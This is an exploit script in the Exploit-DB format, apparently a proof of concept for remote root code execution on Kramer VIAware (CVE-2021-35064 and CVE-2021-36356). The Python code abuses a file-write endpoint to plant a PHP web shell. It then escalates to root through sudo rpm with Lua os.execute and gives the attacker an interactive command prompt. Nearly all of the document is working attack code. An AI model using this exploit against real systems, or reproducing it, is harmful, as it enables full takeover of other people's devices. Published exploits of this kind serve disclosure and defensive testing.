# Exploit Title: Remote Code Execution as Root on KRAMER VIAware
# Date: 31/03/2022
# Exploit Author: sharkmoos
# Vendor Homepage: https://www.kramerav.com/
# Software Link: https://www.kramerav.com/us/product/viaware
# Version: *
# Tested on: ViaWare Go (Linux)
# CVE : CVE-2021-35064, CVE-2021-36356

import sys, urllib3
from requests import get, post
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def writeFile(host):
    headers = {
    "Host": f"{host}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Accept": "text/html, */*",
    "Accept-Language": "en-GB,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Gpc": "1",
    "Te": "trailers",
    "Connection": "close"
    }
    # write php web shell into the Apache web directory
    data = {
        "radioBtnVal":"""<?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }?>""",
        "associateFileName": "/var/www/html/test.php"}
    post(f"https://{host}/ajaxPages/writeBrowseFilePathAjax.php", headers=headers, data=data, verify=False)


def getResult(host, cmd):
    # query the web shell, using rpm as sudo for root privileges
    file = get(f"https://{host}/test.php?cmd=" + "sudo rpm --eval '%{lua:os.execute(\"" + cmd + "\")}'", verify=False)
    pageText = file.text
    if len(pageText) < 1:
        result = "Command did not return a result"
    else:
        result = pageText
    return result

def main(host):
    # upload malicious php
    writeFile(host)
    command = ""
    while command != "exit":
        # repeatedly query the webshell
        command = input("cmd:> ").strip()
        print(getResult(host, command))
    exit()

if __name__ == "__main__":
    if len(sys.argv) == 2:
        main(sys.argv[1])
    else:
        print(f"Run script in format:\n\n\tpython3 {sys.argv[0]} target\n")
